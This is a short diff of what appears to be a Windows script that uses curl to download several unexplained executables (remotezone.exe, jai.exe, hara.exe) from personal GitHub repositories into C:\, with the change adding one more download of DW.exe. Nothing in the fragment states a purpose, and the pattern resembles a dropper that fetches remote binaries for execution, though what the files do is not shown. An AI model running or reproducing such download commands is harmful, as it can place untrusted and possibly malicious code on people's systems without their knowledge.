@@ -20,6 +20,8 @@ curl.exe -L -o C:\remotezone.exe https://raw.githubusercontent.com/hari98486/fff
 
 curl.exe -L -o C:\jai.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/jai.exe"
 
+curl.exe -L -o C:\DW.exe "https://raw.githubusercontent.com/hari98486/jairsreeram/main/DW.exe"
+
 curl -L "https://raw.githubusercontent.com/hari98486/systemcheck/main/hara%20(1).exe" -o "C:\hara.exe"
 
 cd c:/
